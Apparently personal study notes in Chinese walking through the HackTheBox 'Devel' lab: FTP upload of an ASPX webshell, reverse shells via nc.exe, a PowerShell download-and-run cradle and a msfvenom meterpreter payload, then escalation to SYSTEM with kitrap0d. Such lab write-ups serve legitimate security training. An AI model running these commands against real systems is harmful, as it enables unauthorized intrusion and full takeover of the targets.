靶机 10.10.10.5

kali 10.10.16.5

巨佬的文章，学学 [HTB: Devel | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/03/05/htb-devel.html)



# 入口

```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



21：

```bash
└─# ftp 10.10.10.5
```

```bash
wget -r -np -nH ftp://10.10.10.5/aspnet_client
```



80：

```bash
└─# whatweb http://10.10.10.5                                          
http://10.10.10.5 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.5], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]
```

```bash
└─# gobuster dir -u http://10.10.10.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt    
```

```bash
└─# curl -X TRACE 10.10.10.5 
```



漏洞探测

```bash
└─# nmap $ip -p$ports --script=vuln -oN vuln.nmap
```



21端口文件上传

ftp 的目录刚好是 web 网站的目录，尝试文件上传

```bash
└─# locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
└─# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
```

```bash
ftp> put cmd.aspx
```

得到 webshell

<img src="E:\渗透笔记\oscp\hackthebox\图片\Snipaste_2023-09-08_12-20-38.png" alt="Snipaste_2023-09-08_12-20-38" style="zoom:80%;" />

# 提升shell

## smbserver.py共享nc

```bash
└─# mkdir smb
└─# cd smb
└─# locate nc.exe
/root/.cache/vmware/drag_and_drop/CrkIP6/cs4.7/plugin/TaoWu/script/x64/nc.exe
/root/Desktop/cs4.7/plugin/TaoWu/script/x64/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
└─# cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
└─# export PATH=/usr/share/doc/python3-impacket/examples:$PATH
```

```bash
└─# smbserver.py share smb   
```

在 webshell 上 执行

```
\\10.10.16.5\share\nc.exe -e cmd.exe 10.10.16.5 443
```

kali 监听

```
nc -lvnp 443
```

这个方法失败了，但是之前 的 Bastard 靶机里成功了

## Nishang

apt install nisahng  安装

```bash
┌──(root💀kali)-[/usr/share/nishang/Shells]
└─# cp Invoke-PowerShellTcp.ps1 ../../../../../../../root/Devel/
```

增加最后一行到 Invoke-PowerShellTcp.ps1 里

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 443
```

开启简单 python http 服务，在webshell 里执行

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.16.5:1234/Invoke-PowerShellTcp.ps1')
```

监听得到 shell

```powershell
└─# nc -lvvp 443                                                                                                                                              1 ⨯
listening on [any] 443 ...
connect to [10.10.16.5] from 10.10.10.5 [10.10.10.5] 49176
Windows PowerShell running as user DEVEL$ on DEVEL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
```

## MSF

生成 msf 监听的 webshell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=2233 -f aspx > met_rev_2233.aspx
```

ftp 上传 shell

```
ftp> put met_rev_2233.aspx
```

msf 监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 2233
run
```

触发 webshell，可直接浏览器访问，也可以 `curl http://10.10.10.5/met_rev_2233.aspx` 触发

得到  meterpreter

```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```



# 提权到system



```powershell
PS C:\users\babis> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

PS C:\users\babis> systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          8/9/2023, 5:50:41 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.450 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.523 MB
Virtual Memory: In Use:    618 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::2161:4792:753a:9c2e
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

## 手动枚举

一个 win 漏洞提权枚举 脚本 [Watson](https://github.com/rasta-mouse/Watson)

可以在kali开启 smb 共享运行

```
\\10.10.16.5\share\Watson.exe
```

一个漏洞库 https://github.com/abatchy17/WindowsExploits

开启 smb 共享运行 [MS11-046](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe)

```
\\10.10.16.5\share\MS11-046.exe
```

## msf

枚举

```
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

```
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

利用

```
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set lhost tun0
set lport 4433
run
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



```
meterpreter > search -f user.txt
```




